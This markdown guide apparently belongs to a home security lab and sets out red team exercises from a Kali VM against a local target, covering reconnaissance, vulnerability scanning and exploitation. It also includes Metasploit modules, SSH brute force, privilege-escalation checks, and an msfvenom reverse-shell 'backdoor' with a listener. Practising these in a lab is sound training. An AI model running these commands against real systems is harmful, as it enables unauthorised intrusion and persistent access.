# Red Team Exercises

This guide provides a series of exercises to practice offensive security techniques using your Kali Linux virtual machine. These exercises will help you understand common attack vectors and develop skills in penetration testing.

## Prerequisite Setup

Before starting these exercises, ensure:
1. Your Kali Linux VM is properly configured
2. Metasploit is installed and updated
3. The network connection between VMs is established
4. You have basic familiarity with Linux commands and security concepts

## Exercise 1: Reconnaissance

### Network Scanning with Nmap

1. **Basic Network Scan**
   ```bash
   sudo nmap -sn 192.168.176.0/24
   ```
   This will discover active hosts on your network.

2. **Detailed Scan of Ubuntu Server**
   ```bash
   sudo nmap -A 192.168.176.20
   ```
   This will identify open ports, running services, and version information.

3. **Vulnerability Scanning**
   ```bash
   sudo nmap --script vuln 192.168.176.20
   ```
   This scans for known vulnerabilities.

### Information Gathering

1. **Passive Reconnaissance**
   - Use tools like `whois`, `dig`, and `recon-ng` to gather information without directly interacting with the target.
   
2. **Service Enumeration**
   ```bash
   sudo nmap -sV -p 22,80,443 192.168.176.20
   ```
   This identifies specific services running on common ports.

## Exercise 2: Vulnerability Assessment

### Using Metasploit for Vulnerability Scanning

1. **Start Metasploit**
   ```bash
   sudo msfconsole
   ```

2. **Scan for SMB Vulnerabilities**
   ```
   use auxiliary/scanner/smb/smb_version
   set RHOSTS 192.168.176.20
   run
   ```

3. **Scan for SSH Vulnerabilities**
   ```
   use auxiliary/scanner/ssh/ssh_version
   set RHOSTS 192.168.176.20
   run
   ```

### Web Application Assessment

1. **Use Nikto for Web Server Scanning**
   ```bash
   nikto -h 192.168.176.20
   ```

2. **Directory Enumeration with Dirb**
   ```bash
   dirb http://192.168.176.20
   ```

## Exercise 3: Exploitation Techniques

### Basic Exploitation with Metasploit

1. **Search for Exploits**
   ```
   search type:exploit platform:linux
   ```

2. **Set Up a Basic Exploit (Example)**
   ```
   use exploit/unix/webapp/phpmyadmin_config
   set RHOSTS 192.168.176.20
   show options
   set required options
   exploit
   ```

### Password Attacks

1. **SSH Brute Force (For Educational Purposes Only)**
   ```
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 192.168.176.20
   set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
   set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
   set VERBOSE true
   run
   ```

## Exercise 4: Post-Exploitation

### Information Gathering After Access

1. **Basic System Information**
   ```
   sysinfo
   ```

2. **User Information**
   ```
   getuid
   ```

3. **Network Configuration**
   ```
   ifconfig
   netstat -ano
   ```

### Privilege Escalation

1. **Check for SUID Binaries**
   ```
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Check for Writable Files**
   ```
   find / -writable -type f 2>/dev/null
   ```

## Exercise 5: Maintaining Access

### Creating Backdoors (Educational Purposes Only)

1. **Generate a Simple Payload**
   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.176.10 LPORT=4444 -f elf -o backdoor
   ```

2. **Set Up a Listener**
   ```
   use exploit/multi/handler
   set PAYLOAD linux/x86/meterpreter/reverse_tcp
   set LHOST 192.168.176.10
   set LPORT 4444
   exploit
   ```

## Exercise 6: Covering Tracks

### Log Manipulation (Educational Purposes Only)

1. **Viewing System Logs**
   ```bash
   cat /var/log/auth.log
   ```

2. **Learning About Log Locations**
   - `/var/log/auth.log` - Authentication logs
   - `/var/log/syslog` - System logs
   - `/var/log/apache2/access.log` - Web server access logs

## Safe Practice Guidelines

1. **Only attack systems you have permission to test**
2. **Document all your actions**
3. **Be aware of legal implications of security testing**
4. **Report vulnerabilities responsibly**
5. **Use these skills ethically and professionally**

## Next Steps
After practicing these exercises, check out:
- [Blue Team Monitoring](blue_team_monitoring.md) to understand how these attacks can be detected
- Advanced exploitation techniques and custom exploit development 